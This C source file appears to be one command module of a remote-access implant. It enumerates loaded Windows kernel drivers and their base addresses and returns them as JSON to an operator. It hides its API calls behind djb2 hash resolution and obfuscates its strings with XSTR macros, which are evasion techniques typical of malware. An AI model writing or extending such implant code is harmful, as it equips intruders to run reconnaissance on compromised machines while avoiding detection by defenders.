#include "config.h"
#ifdef INCLUDE_CMD_DRIVERS

#include "commands.h"
#include "json_out.h"

// psapi: EnumDeviceDrivers + GetDeviceDriverBaseName
typedef void* (WINAPI *fn_EnumDeviceDrivers_t)(void**, DWORD, DWORD*);
typedef DWORD (WINAPI *fn_GetDeviceDriverBaseNameA_t)(void*, char*, DWORD);

VOID cmd_drivers(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    xstr(_psapi, "psapi.dll");
    HMODULE h_psapi = inst->Win32.LoadLibraryA(_psapi);
    fn_EnumDeviceDrivers_t pEnum = h_psapi ?
        (fn_EnumDeviceDrivers_t)resolve_function(h_psapi, hash_string_djb2(XSTR("EnumDeviceDrivers"))) : NULL;
    fn_GetDeviceDriverBaseNameA_t pBase = h_psapi ?
        (fn_GetDeviceDriverBaseNameA_t)resolve_function(h_psapi, hash_string_djb2(XSTR("GetDeviceDriverBaseNameA"))) : NULL;
    if (!pEnum || !pBase) {
        package_add_string(inst, response, XSTR("psapi resolve failed"));
        response->is_error = TRUE;
        return;
    }

    void* drivers[1024];
    DWORD needed = 0;
    if (!pEnum(drivers, sizeof(drivers), &needed)) {
        package_add_string(inst, response, XSTR("EnumDeviceDrivers failed"));
        response->is_error = TRUE;
        return;
    }
    DWORD count = needed / sizeof(void*);
    if (count > 1024) count = 1024;

    JSON_BUF jb;
    j_init(&jb);
    j_append_raw(&jb, "{\"drivers\":[");
    for (DWORD i = 0; i < count; i++) {
        if (i) j_append_raw(&jb, ",");
        j_append_raw(&jb, "{\"base\":");
        j_append_u64(&jb, (unsigned __int64)drivers[i]);
        j_append_raw(&jb, ",\"name\":");
        char name[256] = {0};
        pBase(drivers[i], name, 255);
        j_append_str(&jb, name);
        j_append_raw(&jb, "}");
    }
    j_append_raw(&jb, "],\"count\":");
    j_append_uint(&jb, count);
    j_append_raw(&jb, "}");
    package_add_bytes(inst, response, (BYTE*)jb.buf, jb.len);
}

#endif
